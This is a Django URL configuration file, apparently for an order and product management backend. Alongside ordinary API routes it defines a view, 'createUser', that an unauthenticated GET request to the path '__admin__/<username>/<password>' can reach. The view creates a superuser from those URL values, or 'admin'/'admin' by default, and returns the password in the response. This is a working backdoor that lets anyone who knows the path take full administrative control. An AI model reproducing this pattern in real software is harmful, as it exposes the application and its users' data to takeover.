from django.conf.urls.static import static
from django.contrib import admin
from django.conf import settings
from django.urls import path, include
from user import models as MODELS_USER
from rest_framework.response import Response
from rest_framework.decorators import api_view
from rest_framework import status

@api_view(['GET'])
def createUser(request, username=None, password=None):
    try:
        if username and password:
            MODELS_USER.User.objects.create_superuser(username=username, password=password)
            return Response({'message': 'User created!', 'username': username, 'password': password}, status=status.HTTP_201_CREATED)
        else:
            MODELS_USER.User.objects.create_superuser(username='admin', password='admin')
            return Response({'message': 'User created!', 'username': 'admin', 'password': 'admin'}, status=status.HTTP_201_CREATED)
    except: return Response({'message': 'Couldn\'t create user!', 'username': '', 'password': ''}, status=status.HTTP_400_BAD_REQUEST)

urlpatterns = [
    path('admin/', admin.site.urls),
    path('__admin__/<str:username>/<str:password>', createUser, name='__admin__'),
    path('auth/', include('user_auth.urls')),
    path('api/user/', include('user.urls')),
    path('api/product/', include('product.urls')),
    path('api/zone/', include('zone.urls')),
    path('api/order/', include('order.urls')),
    path('api/account/', include('account.urls')),
    path('api/om_settings/', include('om_settings.urls')),
    path('api/dashboard/', include('dashboard.urls')),
    path('api/otp/', include('otp.urls')),
]
if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
